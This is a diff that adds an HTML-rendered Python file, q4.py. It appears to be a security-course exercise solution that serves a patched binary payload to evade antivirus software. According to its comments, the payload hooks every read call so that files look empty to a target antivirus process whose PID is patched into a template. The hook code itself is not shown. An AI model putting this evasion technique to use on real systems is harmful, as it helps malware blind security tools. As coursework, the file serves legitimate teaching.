@@ -1,0 +1,63 @@
+<html>
+<head>
+<title>q4.py</title>
+<meta http-equiv="Content-Type" content="text/html; charset=utf-8">
+<style type="text/css">
+.ln { color: #606366; font-weight: normal; font-style: normal; }
+.s0 { color: rgb(204,120,50); font-weight: bold; }
+.s1 { color: rgb(169,183,198); }
+.s2 { color: rgb(165,194,97); }
+.s3 { color: rgb(104,151,187); }
+.s4 { color: rgb(204,120,50); }
+.s5 { color: rgb(128,128,128); }
+</style>
+</head>
+<BODY BGCOLOR="#2b2b2b">
+<TABLE CELLSPACING=0 CELLPADDING=5 COLS=1 WIDTH="100%" BGCOLOR="#606060" >
+<TR><TD><CENTER>
+<FONT FACE="Arial, Helvetica" COLOR="#000000">
+q4.py</FONT>
+</center></TD></TR></TABLE>
+<pre>
+<a name="l1"><span class="ln">1    </span></a><span class="s0">import </span><span class="s1">assemble 
+<a name="l2"><span class="ln">2    </span></a></span><span class="s0">import </span><span class="s1">server 
+<a name="l3"><span class="ln">3    </span></a></span><span class="s0">import </span><span class="s1">struct 
+<a name="l4"><span class="ln">4    </span></a> 
+<a name="l5"><span class="ln">5    </span></a>TEMPLATE_PATH = </span><span class="s2">&quot;./q4.template&quot;</span><span class="s1"> 
+<a name="l6"><span class="ln">6    </span></a>ANTI_PID_HOLDER = </span><span class="s3">0x12345678</span><span class="s1"> 
+<a name="l7"><span class="ln">7    </span></a> 
+<a name="l8"><span class="ln">8    </span></a></span><span class="s0">class </span><span class="s1">SolutionServer(server.EvadeAntivirusServer): 
+<a name="l9"><span class="ln">9    </span></a> 
+<a name="l10"><span class="ln">10   </span></a>    </span><span class="s0">def </span><span class="s1">get_payload(self</span><span class="s4">, </span><span class="s1">pid): 
+<a name="l11"><span class="ln">11   </span></a>        </span><span class="s5"># Return a payload that will intercept all calls to read (for all files)</span><span class="s1"> 
+<a name="l12"><span class="ln">12   </span></a>        </span><span class="s5"># with calls that read a length of 0 (to make files appear empty).</span><span class="s1"> 
+<a name="l13"><span class="ln">13   </span></a>        </span><span class="s5"># 1. You can assume we already compiled q4.c into q4.template.</span><span class="s1"> 
+<a name="l14"><span class="ln">14   </span></a>        </span><span class="s0">with </span><span class="s1">open(TEMPLATE_PATH</span><span class="s4">, </span><span class="s2">'rb'</span><span class="s1">) </span><span class="s0">as </span><span class="s1">reader: 
+<a name="l15"><span class="ln">15   </span></a>            payload_template = reader.read() 
+<a name="l16"><span class="ln">16   </span></a>         
+<a name="l17"><span class="ln">17   </span></a>        </span><span class="s5"># convert the address to bytes before lookup</span><span class="s1"> 
+<a name="l18"><span class="ln">18   </span></a>        anti_pid_holder_bytes = struct.pack(</span><span class="s2">'&lt;L'</span><span class="s4">, </span><span class="s1">ANTI_PID_HOLDER) 
+<a name="l19"><span class="ln">19   </span></a> 
+<a name="l20"><span class="ln">20   </span></a>        </span><span class="s5"># find and replace with the real value in the .text segment of the template binary</span><span class="s1"> 
+<a name="l21"><span class="ln">21   </span></a>        pid_addr = payload_template.find(anti_pid_holder_bytes) 
+<a name="l22"><span class="ln">22   </span></a> 
+<a name="l23"><span class="ln">23   </span></a>        payload = payload_template 
+<a name="l24"><span class="ln">24   </span></a>        payload = payload[:pid_addr] + struct.pack(</span><span class="s2">&quot;&lt;L&quot;</span><span class="s4">, </span><span class="s1">pid) + payload[pid_addr+</span><span class="s3">4</span><span class="s1">:] 
+<a name="l25"><span class="ln">25   </span></a> 
+<a name="l26"><span class="ln">26   </span></a>        </span><span class="s0">return </span><span class="s1">payload 
+<a name="l27"><span class="ln">27   </span></a> 
+<a name="l28"><span class="ln">28   </span></a>    </span><span class="s0">def </span><span class="s1">print_handler(self</span><span class="s4">, </span><span class="s1">payload</span><span class="s4">, </span><span class="s1">product): 
+<a name="l29"><span class="ln">29   </span></a>        </span><span class="s0">print</span><span class="s1">(product) 
+<a name="l30"><span class="ln">30   </span></a> 
+<a name="l31"><span class="ln">31   </span></a>    </span><span class="s0">def </span><span class="s1">evade_antivirus(self</span><span class="s4">, </span><span class="s1">pid): 
+<a name="l32"><span class="ln">32   </span></a>        self.add_payload( 
+<a name="l33"><span class="ln">33   </span></a>            self.get_payload(pid)</span><span class="s4">,</span><span class="s1"> 
+<a name="l34"><span class="ln">34   </span></a>            self.print_handler) 
+<a name="l35"><span class="ln">35   </span></a> 
+<a name="l36"><span class="ln">36   </span></a> 
+<a name="l37"><span class="ln">37   </span></a></span><span class="s0">if </span><span class="s1">__name__ == </span><span class="s2">'__main__'</span><span class="s1">: 
+<a name="l38"><span class="ln">38   </span></a>    SolutionServer().run_server(host=</span><span class="s2">'0.0.0.0'</span><span class="s4">, </span><span class="s1">port=</span><span class="s3">8000</span><span class="s1">) 
+<a name="l39"><span class="ln">39   </span></a> 
+<a name="l40"><span class="ln">40   </span></a></span></pre>
+</body>
+</html>
